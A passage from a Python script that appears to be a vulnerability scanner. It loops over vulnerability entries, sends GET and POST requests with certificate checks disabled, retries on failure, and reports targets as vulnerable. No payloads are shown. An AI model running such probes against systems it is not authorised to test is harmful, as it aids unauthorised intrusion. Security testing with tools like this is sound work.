                print(Fore.RED + f"[!] Error verifying upload for {vuln['id']}: {e}")
        continue

    # === GET / POST
    params = vuln.get("params") if "params" in vuln else None
    for attempt in range(3):
        try:
            if vuln["method"] == "GET":
                response = requests.get(
                    full_url,
                    params=params,
                    headers=check_headers,
                    timeout=DEFAULT_TIMEOUT,
                    verify=False,
                    proxies=proxy,
                    allow_redirects=False
                )
                if response and vuln["check"](response):
                    print(Fore.GREEN + f"[!] {vuln['id']} vulnerable!")
                    break
            elif vuln["method"] == "POST":
                response = requests.post(
                    full_url,
                    data=params,
                    headers=check_headers,
                    timeout=DEFAULT_TIMEOUT,
                    verify=False,
                    proxies=proxy,
                    allow_redirects=False
                )
                if response and vuln["check"](response):
                    print(Fore.GREEN + f"[!] {vuln['id']} vulnerable!")
                    break
            elif vuln["method"] == "GET_POST": 
                response = requests.get(
                    full_url,
                    params=params,
                    headers=check_headers,
                    timeout=DEFAULT_TIMEOUT,
                    verify=False,
                    proxies=proxy,
                    allow_redirects=False
                )
                if response and vuln["check"](response):
                    print(Fore.GREEN + f"[!] {vuln['id']} vulnerable!")
                    break
                
                # if GET fails, retry 3 times
                get_attempts = 0
                while response.status_code is None or "no response received from remote server" in html.unescape(response.text).lower():
                    if get_attempts >= 3:
                        print(Fore.RED + f"[!] GET failed after 3 attempts.")
                        break
                    response = requests.get(
                        full_url,
                        params=params,
                        headers=check_headers,
                        timeout=DEFAULT_TIMEOUT,
                        verify=False,
                        proxies=proxy,
                        allow_redirects=False
                    )
                    if response and vuln["check"](response):
                        print(Fore.GREEN + f"[!] {vuln['id']} vulnerable!")
                        break
                    get_attempts += 1
                if response and vuln["check"](response):
                    break

                # If GET works, pass to POST method
                if response.status_code is not None and "no response received from remote server" not in html.unescape(response.text).lower():
                    response_post = requests.post(
                        full_url,
                        data=params,
                        headers=check_headers,
                        timeout=DEFAULT_TIMEOUT,
                        verify=False,
                        proxies=proxy,
                        allow_redirects=False
                    )
                    if response_post and vuln["check"](response_post):
                        print('before0')
                        print(Fore.GREEN + f"[!] {vuln['id']} vulnerable!")
                        break

                    # if POST fails, retry 3 times
                    post_attempts = 0
                    while response_post.status_code is None or "no response received from remote server" in html.unescape(response_post.text).lower():
                        if post_attempts >= 3:
                            print(Fore.RED + f"[!] POST failed after 3 attempts.")
                            break
                        response_post = requests.post(
                            full_url,
                            data=params,
                            headers=check_headers,
                            timeout=DEFAULT_TIMEOUT,
                            verify=False,
                            proxies=proxy,
                            allow_redirects=False
                        )
                        print(html.unescape(response_post.text).lower())
                        if response_post and vuln["check"](response_post):
                            print('before1')
                            print(Fore.GREEN + f"[!] {vuln['id']} vulnerable!")
                            break
                        post_attempts += 1
                    
                    # Si POST réussit, sortir de la boucle
                    if response_post.status_code is not None and "no response received from remote server" not in html.unescape(response_post.text).lower():
                        break
                    else:
                        print(Fore.RED + f"[!] POST failed after 3 attempts.")
                else:
                    print(Fore.RED + f"[!] GET failed after 3 attempts, skipping POST.")
            
            if response.status_code is not None and "no response received from remote server" not in html.unescape(response.text).lower():
                break
            else:
                print(Fore.YELLOW + f"[!] Retry {attempt + 1}/3 due to invalid response.")

        except requests.exceptions.RequestException as e:
            if attempt == 2:
               raise e
            print(Fore.YELLOW + f"[!] Retry {attempt + 1}/3 due to: {e}")
